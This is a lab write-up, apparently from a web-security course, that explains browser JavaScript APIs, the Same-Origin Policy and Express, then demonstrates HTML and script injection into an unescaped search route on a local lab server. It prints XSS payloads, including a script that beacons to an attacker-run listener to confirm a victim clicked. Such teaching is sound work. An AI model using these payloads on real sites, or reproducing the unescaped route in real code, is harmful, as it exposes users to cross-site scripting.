[Part 1: Before we start]

    - This time I gonna tell you a little bit about JavaScript web APIs

        (The hierarchy below is created by CBJS, I just re-draw it in ASCII)

                                  +-------------+
                            +-----|   history   |
                            |     +-------------+ 
                            |  
                            |  
          +-----------+     |     +-------------+
          |  windows  |-----+-----|  location   |
          +-----------+     |     +-------------+
                            |
                            |
                            |     +-------------+
                            +-----|  navigator  |
                            |     +-------------+                                                   (...) 
                            |                                                                         |
                            |                               +------------+     +----------------+     |     +--------------+                 +-----------------+
                            |                         +-----|    body    |-----| div (id=lobby) |-----+-----| p (id=room1) |--- InnerText ---| Thank you! CBJS |
                            |                         |     +------------+     +----------------+     |     +--------------+                 +-----------------+
                            |                         |                                               |
                            |                         |                                             (...)
                            |     +-------------+     |     +------------+ 
                            +-----|     DOM     |-----+-----|   cookie   |
                                  +-------------+     |     +------------+ 
                                                      |
                                                      |
                                                      |     +-------------+ 
                                                      +-----| DOM Methods |
                                                            +-------------+

        [?] "APIs" _ "Application Programming Interfaces" are sets of rules and protocols that allow different software applications to communicate with each other.

        [?] "window" is where everything begins, it is the first thing created when the browser opens a website

                [Example]: window.InnerHeight <=> 0
                        
                           window.InnerWidth <=> 0

        [?] "navigator" contains information about the user's browser    

                [Example]: window.navigator.userAgent <=> Mozilla/5.0 (X11, Linux x86_64, rv:109.0) Gecko/20109101 Firefox/114.0
                        
                           window.navigator.language <=> en-US

        [?] "history" allows us to interact with the browser's history

                [Example]: window.history.lenght <=> 177013 (~.~!)
                        
                           window.history.back() <=> return to the previous web

        [?] "location" stores info about the URL of the website you are using. Also, it can help you redirect to the other websites

                [Example]: window.location.href <=> https://www.hungthinhtran.com
                        
                           window.location.protocol  <=> https

        [?] "DOM Methods" contains many functions like getElementById(), getElementByTagName(), getElementByClassName() ...
                           all of them were born to help developers interact with DOM tree 

    - A long time ago, in a galaxy far far away, there was a man called Tim Berners-Lee, he is the father of WWW (World Wide Web) and HTML (Yeah! he's still alive)

    - Since HTML is just like a blue-print for the website and there is no user interaction, developers want something that can make their website more lively

        => That is the reason why JavaScript was born

    - But each browser used JavaScript in its own way, which led to a consequence that your browser may not show websites that were created for another specific browser

        => And W3C (World Wide Web Consortium) was the one who united them all by publicizing the DOM tree (Document Object Model) => The problem was solved

    - So! Before deep dive into the battlefield of injection, you should know about SOP (Same-Origin Policy)

        [+] This is a fundamental security mechanism in the World Wide Web that restricts how a web browser interacts with resources from different origins.

            => Prevent malicious scripts from accessing sensitive data from other websites without the user's consent

        [+] The SOP enforces the concept of origin, which is typically defined as a combination of the scheme (like HTTP or HTTPS), hostname, and port number of a URL.

        [+] A web page loaded from one origin cannot make requests to resources from a different origin unless explicitly allowed.

    - Now, we gonna focus on Express - Node.js, I will explain them as slowly and easy to understand as possible

    - The question is "What are Node.js and Express"

        [+] Node.js is a JavaScript runtime environment, which allows you to execute JS code outside of the web browser 
            (it means that it primarily resides in the realm of back-end development)

            Node.js excels in handling server-side operations, such as processing requests, managing data, and communicating with databases.

            While Node.js can be employed for front-end tasks, such as creating interactive user interfaces, its true strength lies in the back-end

        [+] Express is a web framework built upon Node.js, much like a castle is built upon a foundation of stone

            Express empowers developers to define routes, handle HTTP requests, render dynamic content, and manage application state

            While Node.js is the engine that powers your application, Express serves as the framework that shapes its structure and organization.

    - Now! you may read the Dockerfile and think "What the hack is going on". Nah! it just a few lines of docker setup for npm to download some dependencies and open http server

        [?] npm stands for "Node Package Manager." It is the default package manager for Node.js

            Using package.json, it can download various external libraries (you can specify them in a package.json file)

            Just think about the relationship between maven and pom.xml, this one is kinda liked that


--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


[Part 2: HTML Injection]

[Level 1]

[*] Target: http://localhost:13001/

    - First thing first, you need to see the tree

            root@8202d29b3513:/app# tree
            .
            |-- app.js
            |-- package.json
            |-- routes
            |   |-- index.js
            |   `-- note.js
            `-- views
                `-- index.ejs

    - This is where our web server is running (npm start here)

        [?] app.js: a script that sets up and configures an Express.js web application

            Example: 

                    [+] Sets the port on which the server will listen

                        const port = parseInt(process.env.PORT) || 3000;

                        => And yeah! This the reason why these lines existed in the Dockerfile

                            ports:
                                - "13001:3000"

                    [+] configure the view engine for rendering templates

                            app.set("views", path.join(__dirname, "views"));
                            app.set("view engine", "ejs");
                   
                        => Sound weird right? Since we are all farmiliar with the automated rendering function in PHP

                    ...

        [?] package.json: just like the pom.xml in Java, they all be used to config and download dependencies

        [?] /routes: This folder contains js files that are used to handle the main functions of the website

                    var indexRouter = require("./routes/index");
                    app.use(indexRouter);

                    var noteRouter = require("./routes/note");
                    app.use(noteRouter);

    - After playing a little bit, we know that "Note here: {anything you typed}" takes us to "OK"

      and "Search: {anything you typed}" led us to search?q={anything you typed} <=> "Your search - {anything you typed} - did not match any notes."

    - Cool! now we gonna look at the back-end

            [+] note.js:    

                const { application } = require('express');
                var express = require('express'); // [?] "require" in JS is just like "import" library in python, and in this case, they used "express"
                var router = express.Router(); // [?] router variable from now on can handle routes

                router.get('/note', function (req, res, next) { // [?] When a client sends a GET request to this endpoint, the function will be executed
                    res.json(req.session.notes); // [?] Sends a JSON response to the client, where the content of the response is the array of notes
                });

                // Hehe, we gonna see it later since ... <form action="/note" method="post"> ...

                router.post('/note', function (req, res, next) { // [?] When a client sends a POST ... we all know what's going on right 
                    req.session.notes.push(req.body.note);
                    res.send("OK");
                });

                module.exports = router;

            [Testing time] I change the "post" request to "get"

                    POST /note HTTP/1.1
                    Host: localhost:13001
                    ...              

                    note=thinhbeo31337

                    => GET /note?note=thinhbeo31337 HTTP/1.1
                    ...

                => 0 : "thinhbeo31337" (and a black screen with a variable is set in Json format)

            => However, there is no place for us to inject HTML code

            [+] index.js:

                ...
                router.get('/search', function (req, res, next) {
                    html = 'Your search - <b>' + req.query.q + '</b> - did not match any notes.<br><br>'
                    res.send(html);
                });
                ...

                => Yeah! that's what I'm talking about (^.^~)

            => In this case, if what I typed was "<a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ">click here</a>" 

            <=> http://localhost:13001/search?q=%3Ca%20href=%22https://www.youtube.com/watch?v=dQw4w9WgXcQ%22%3Eclick%20here%3C/a%3E

            => The result will look like this "Your search - click here - did not match any notes."

                <=> Your search - <b><a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ">click here</a></b> - did not match any notes.<br><br>

        - Not only HTML you can also inject JS code, we have <script> tag right (~.~!), and you can do something like 

            => <script>alert("bạn đã bị hắc cơ lỏ vụt cho tung đít")</script>

        => And if you sent the injected URL to someone else, they will also see the alert

        - Just a bonus, how can we know whether they clicked on our URL or not, let me remind you of the trigger trick 

        => <script>var payload = new XMLHttpRequest(); payload.open('GET', 'http://localhost:12345/mot_thang_vua_bi_vut', true); payload.send();</script>

            (base) bigbox@ubuntu:~/Desktop$ python3 -m http.server 12345
            Serving HTTP on 0.0.0.0 port 12345 (http://0.0.0.0:12345/) ...
            127.0.0.1 - - [13/Jan/2024 00:33:11] code 404, message File not found
            127.0.0.1 - - [13/Jan/2024 00:33:11] "GET /mot_thang_vua_bi_vut HTTP/1.1" 404 -

    [Final Result: Injected] Your search - <b><script>var payload = new XMLHttpRequest(); ... payload.send();</script></b> - did not match any notes.<br><br>